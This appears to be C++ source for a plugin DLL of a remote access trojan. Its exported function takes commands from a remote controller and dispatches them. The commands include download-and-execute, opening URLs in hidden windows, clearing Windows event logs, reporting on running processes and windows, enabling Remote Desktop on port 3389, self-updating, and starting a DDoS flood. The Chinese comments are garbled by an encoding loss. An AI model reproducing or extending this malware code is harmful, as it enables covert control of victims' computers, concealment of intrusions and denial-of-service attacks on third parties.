#include "ClientSocket.h"
#include "others.h"

#pragma comment(lib,"msvcrt.lib")
#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98 /nodefaultlib:libcmt.lib")

CClientSocket	*m_pClient;

extern "C" __declspec(dllexport) BOOL PluginMeEx(LPCTSTR lpszHost, UINT nPort,LPBYTE lpBuffer,LPBYTE lpFun1,LPBYTE lpFun2,DWORD flags)
{
	switch (lpBuffer[0])
	{
	case COMMAND_DOWN_EXEC: // ������
		MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // ���ݲ�����
		break;
	case COMMAND_OPEN_URL_SHOW: // ��ʾ����ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // ���ش���ҳ
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // ж��,
		ExitProcess(0);
		break;
	case COMMAND_CLEAN_EVENT: // �����־
		CleanEvent();
		break;
	case COMMAND_SESSION:
		ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_RENAME_REMARK: // �ı�ע
		SetHostID((TCHAR*)lpFun1, (LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_UPDATE_SERVER: // ���·����
		if (UpdateServer((TCHAR *)lpBuffer + 1))
		break;
	case COMMAND_REPLAY_HEARTBEAT: // �ظ�������
		break;
	case COMMAND_SORT_PROCESS: // ����ɸѡ
		__try
		{
			if (EnumProcesin((LPTSTR)(lpBuffer + 1)))
			{
				BYTE bToken = TOKEN_INFO_YES;
				m_pClient->Send(&bToken, 1);
			}else
			{
				BYTE bToken = TOKEN_INFO_NO;
				m_pClient->Send(&bToken, 1);
			}
		}
		__except(1){}
		
		break;
	case COMMAND_SORT_WINDOW: // ����ɸѡ
		__try
		{
			_tcscpy(temp_proc,(LPTSTR)(lpBuffer + 1));
			EnumWindows(EnumWindowsList,0);
			if (proc_tag)
			{
				BYTE bToken = TOKEN_INFO_YES;
				m_pClient->Send(&bToken, 1);
				proc_tag = false;
			}else
			{
				BYTE bToken = TOKEN_INFO_NO;
				m_pClient->Send(&bToken, 1);
			}
		}
		__except(1){}
		
		break;
	case COMMAND_OPEN_3389: 
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Open3389, 
			(LPVOID)(lpBuffer + 1), 0,	NULL, true);

		break;
		
	case COMMAND_DDOS: 
		MyCreateThread(NULL,0,DDOSLOOP,(LPVOID)(lpBuffer + 1),0,NULL,true);

		break;
	}
	return 0;
}

BOOL APIENTRY mymain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}

